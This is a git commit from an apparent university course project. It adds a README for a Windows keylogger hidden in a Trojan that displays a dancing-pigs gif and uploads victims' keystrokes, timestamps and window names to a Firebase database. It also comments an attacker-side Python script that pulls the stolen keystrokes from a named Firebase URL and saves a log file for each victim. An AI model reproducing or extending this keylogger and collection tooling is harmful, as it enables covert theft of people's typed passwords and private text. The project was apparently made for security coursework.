6be8b4e12e7c5fae3b7b51a51eb2fc51179f45ef
TamaraWallace <60551202+TamaraWallace@users.noreply.github.com>
2020-12-02 17:38:46 -0700

    Documentation
    Created README file, changed name of getKeysMany to getKeys and commented said file.

--- README.md
+++ README.md
@@ -1,1 +1,16 @@
-# cpsc329_Unessay
+# CPSC 329 Unessay Project Group 12
+
+## Introduction
+
+For this project, we made a keylogger that targets the Windows 10 operating system. This keylogger will be hidden in a Trojan program that displays a gif of dancing pigs and runs the keylogger for the first time. The keylogger will send the target's keystrokes, time of keystroke and window where the key was pressed. to a Goggle Firebase database via an HTTP post request. Another script on the attacker's computer retrieves this data using an HTTP get request.
+
+## Technologies
+
+This project was created entirely (primarily) in Python 3 using several external libraries such as requests and the Google Firebase API. Both the keylogger and the Trojan file are bundled with necessary libraries into executable files so that the target does not need to have Python installed on their machine for the keylogger to run. It is assumed that the attacker has Python installed and those programs are run as standard Python scripts.
+
+### Files
+
+There are two folders in this project: main_ver and getLogFile. The files in the main_ver folder are placed on the target machine, namely the keylogger and the hook. The executable fies for both of these programs are inside the dist subfolder of main_ver. The other folder, getLogFile, contains the Python scripts needed to generate and read the log files as well as some smaple log files.
+
+## Launch
+To launch the keylogger or Trojan program (called hook.py or hook.exe), you can either run the Python file from the command line or click on the executable file in the dist folder.
--- getLogFile/getKeys.py
+++ getLogFile/getKeys.py
@@ -1,58 +1,87 @@
 from firebase import firebase
 import requests
 
+# Firebase API Documentation: https://pypi.org/project/python-firebase/
+# make a get request to the firebase server where keylogs are sent
 firebase = firebase.FirebaseApplication('https://testunessayproject.firebaseio.com/', None)
 result = firebase.get('person', None)
 
-
+# Description: function to save keystrokes for all users into text files organized by user name
+# Parameters: None
+# Return: None, just prints out function progress and writes information to the log files
 def getAll():
-	
+	# loop through all users in database
 	for x in result:
+		# create a log file based on user's username
 		f = result[x]['user'] + "_Log.txt"
 		file = open(f, "w", encoding="utf-8")
+		
+		# loop through all data entries in the user
 		for i in result[x]:
-			
+			# if you are looking at the keystrokes section, split keystrokes aroung '~'
 			if i=="keystroke":
+				# write the keystrokes header to the file for the data section
 				file.write(i+":\n")
 				keys = result[x][i].split("~")
 				for j in keys:
+					# write each keystroke data (key pressed, time pressed, where it was pressed) to the log file on a new line
 					file.write(j + "\n")
 			else:
+				# split the data around '~'
 				aList = result[x][i].split('~')
 				temp = []
+				# for everything in aList, if the field is not empty, append it to a temporary list
 				for j in  aList:
 					if j != '':
 						temp.append(j)
 				aList = temp
+				# write the  list to the log file
 				file.write(i +':\n' +str(aList) +"\n")
+		# add newline character to end of file
 		file.write("\n")
+	# close the file
 	file.close()
+	# print done to the terminal to let the attacker know the data has been written to the file
 	print('Done\n')
 
+# Description: function to refresh the information retrieved from the database
+# Parameters: None
+# Return: None
 def refresh():
 	result = firebase.get('person', None)
 	print('Refresh Done\n')
 
+# Description: function to display all user names to the attacker
+# Parameters: None
+# Return: None
 def getUser():
+	# refreshing the variable to ensure it is up to date
 	refresh()
 	
+	# print all usernames
 	for x in result:
 		name = result[x]['user']
 		print(name)
 	print('done')
 	
-
+# Description: function to get keystrokes by username
+# Parameters: None
+# Return: None
 def getByName():
+	# refreshing the variable to ensure it is up to date
 	refresh()
 	
+	# display all names to attacker so they can select which user they want to view
 	i=0
 	for x in result:
 		name = result[x]['user']
 		print( f'{i} : {name}')
 		i += 1
 	
+	# get which user they want to view
 	num = int(input('choose the number: '))
 
+	# loop through all users and if the index matches the number entered by the user, write that information to the appropriate file
 	i = 0
 	for x in result:
 		name = result[x]['user']
@@ -74,6 +103,7 @@ def getByName():
 def getPass():
 	pass
 
+# run the program
 if __name__=='__main__':
 	while True:
 	
